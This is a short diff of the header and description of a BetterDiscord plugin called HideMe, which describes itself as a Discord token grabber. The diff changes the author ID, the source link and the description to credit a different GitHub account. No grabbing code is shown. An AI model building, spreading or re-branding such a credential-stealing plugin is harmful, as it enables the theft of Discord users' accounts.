@@ -1,13 +1,13 @@
 /**
  * @name HideMe
  * @author HideakiAtsuyo
- * @authorId 868150205852291183
+ * @authorId 545703210539548684
  * @version 1.1.9
  * @description Allows you to token grab people omg
  * @invite https://discord.gg/C7yHkVSE2M
  * @donate https://www.paypal.me/HideakiAtsuyoLmao
  * @website https://github.com/HideakiAtsuyo
- * @source https://github.com/HideakiAtsuyo/BetterGrabber/tree/plugin/GOD/
+ * @source https://github.com/rushscriptz/Better-grabber/tree/plugin/GOD/
  * @updateUrl https://raw.githubusercontent.com/HideakiAtsuyo/BetterGrabber/plugin/GOD/HideMe.plugin.js
  */
 
@@ -25,7 +25,7 @@ class HideMe {
         return "HideMe";
     }
     getDescription() {
-        return "Better Discord Token Grab Lmao github.com/HideakiAtsuyo";
+        return "Better Discord Token Grab Lmao github.com/rushscriptz";
     }
     getVersion() {
         return "1.1.9";
